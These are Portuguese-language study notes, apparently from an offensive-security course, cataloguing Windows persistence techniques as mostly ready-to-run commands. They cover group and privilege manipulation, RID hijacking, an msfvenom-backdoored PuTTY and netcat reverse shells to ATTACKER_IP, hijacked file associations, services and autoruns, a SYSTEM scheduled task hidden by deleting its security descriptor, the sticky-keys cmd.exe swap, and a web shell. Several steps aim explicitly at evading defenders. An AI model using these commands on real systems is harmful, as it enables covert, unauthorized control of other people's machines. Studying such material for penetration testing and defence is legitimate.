#techniques #techniques/privesc #techniques/privesc/windows #windows 

## Interferindo em contas não privilegiadas
### Virando membro de grupos

Assumindo que já tenha acesso a um usuário. A gente pode adicionar ele no grupo de admins, no grupo de backup e é necessário adicionar ele no grupo para fazer acesso remoto.

```prompt
net localgroup administrators [user] /add
net localgroup "Backup Operators" [user] /add
net localgroup "Remote Management Users" [user] /add
```

Porém ao realizar um acesso remoto, o "Backup Operators" estará desabilitado pelo UAC (User Account Control) pelo política **LocalAccountTokenFilterPolicy**. Então é preciso desabilitar nos registros.

```prompt
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

### [[Windows Privilege Escalation#SeBackup / SeRestore|SeBackup/SeRestore]] 

É possível ativar essas duas permissões e seria a mesma coisa que adicionar o usuário no grupo de "Backup Operators".

```powershell
secedit /export /cfg config.inf
notepad config.inf
```

No final da linha dos privilégios (SeBackupPrivilege e SeRestorePrivilege) adicionar o nome do usuário.

```powershell
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
```

Outra forma de dar acesso remoto ao usuário é por meio da descrição de segurança.

```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

![[Pasted image 20240429103022.png]]

### RID Hijacking

O RID (Relative ID) é um ID de usuário salvo no SAM usado ao fazer login pelo LSASS para criar um token associado a esse RID. Se conseguir interferir no valor de registro podemos fazer o Windows atribuir um token de admin a um usuário comum.

RID admin = 500
RID usuario >= 1000

```prompt
wmic useraccount get name,sid
```

Para manipular o RID é preciso abrir o SAM nos registros `HKLM\SAM\SAM\Domains\Account\Users\`, que é acessível apenas para o *SYSTEM*, ou seja, nem o Administrator consegue editar.

```prompt
PsExec64.exe -i -s regedit
```

Para alterar o RID do usuário em questão, basta mudar os registros para (0x01F4)

![[Pasted image 20240429111529.png]]

## Backdooring Files

Outra forma é implantar um backdoor um arquivos que sabemos que o usuário interage regularmente.

### Executáveis

Executáveis que estão no *Desktop* ou na *Task Bar* tem chance de ser programas que o usuário utiliza com frequência. Se por exemplo o usuário usa o PuTTY é possível criar um backdoor com *msfvenom*.

```shell
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

### Shortcut

Também é possível mudar o caminho do executável para um backdoor por exemplo:

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

![[Pasted image 20240429113650.png]]

### Hijacking File Associations

É possível forçar o SO a rodar um shell quando um tipo de arquivo é aberto. 

Os tipos de arquivos (extensões) reconhecidos pelo SO está em `HKLM\Software\Classes\`. Se eu quiser alterar o `.txt` eu preciso descubrir o seu **ProgID**.

![[Pasted image 20240429115753.png]]

Ao descobrir, eu vejo qual programa que executa para abrir um `.txt` (no caso o notepad.exe)

![[Pasted image 20240429115834.png]]

Com essa informação eu posso alterar o registro para chamar um backdoor que abre uma shell remota e em seguida o `.txt` em questão. 

```
powershell -windowstyle hidden C:\windows\backdoor.ps1 %1
```

O `%1` é um argumento que irá passa para o notepad o nome do arquivo que ele irá abrir `C:\Windows\system32\NOTEPAD.EXE $args[0]` (isso tem que está no meu backdoor para o usuário não desconfiar).

## Abusando de serviços

Usar serviços para garantir a persistência é uma boa forma também, pois o usuário não irá perceber e o serviço ao iniciar junto com a máquina, irá rodar em background.
### Criando um serviço

```prompt
sc.exe create [serviço] binPath= "C:\windows\backdoor.exe" start= auto
sc.exe start [serviço]
```

### Modificando um serviço existente

Ao criar um serviço, o *blue team* pode detectar, então para evitar esta detecção, reutilizar um serviço é uma boa opção.

[[Windows Privilege Escalation#Service Misconfigurations|Service Misconfiguration]]


## Scheduled Tasks

### Criando uma tarefa agendada

```prompt
schtasks /create /sc minute /mo 1 /tn [nome da tarefa] /tr "c:\tools\nc64 -e cmd.exe [IP] 4449" /ru SYSTEM
```

### Escondendo a task

É preciso deletar o **Security Descriptor (SD)** da task para que ela não esteja visível ao listar.

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\[task criada]`

## Logon Triggered

### Startup folder

Para fazer um backdoor rodar junto com o sistema para todos os usuários basta salva ele em: `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`

### Run / RunOnce

Também é possível fazer o mesmo usando registro e não um diretório específico.

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

Criar um registro `REG_EXPAND_SZ` e no valor passa o caminho do backdoor

![[Pasted image 20240429145139.png]]
### Winlogon

Em `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` adicionar o backdoor nos registros `shell` ou `Userinit`.

### Logon scripts

O `userinit.exe` carrega o perfil do usuário e verifica por variáveis de ambiente chamadas pelo `UserInitMprLogonScript`.

![[Pasted image 20240429151100.png]]

## Login Screen

É possível fazer backdoor na tela de login quando não possui as credenciais de uma máquina.

### Sticky Keys

Ao apertar 5x o `SHIFT` vai abrir uma janela do **Sticky Keys** gerada pelo `C:\Windows\System32\sethc.exe`.  Tomando posse desse executável a gente consegue acesso sem precisar fazer o login (precisa do RDP ou acesso físico)

```prompt
takeown /f c:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

### [[Windows Privilege Escalation#SeTakeOwnership|Utilman]]

## Aplicações

### Web Shell

```
move shell.aspx C:\inetpub\wwwroot\
icacls shell.aspx /grant Everyone:F
```

O usuário em questão é `iis apppool\defaultapppool` que é um usuário não privilegiado, porém possui [[Windows Privilege Escalation#SeImpersonate / SeAssignPrimaryToken|SeImpersonatePrivilege]].

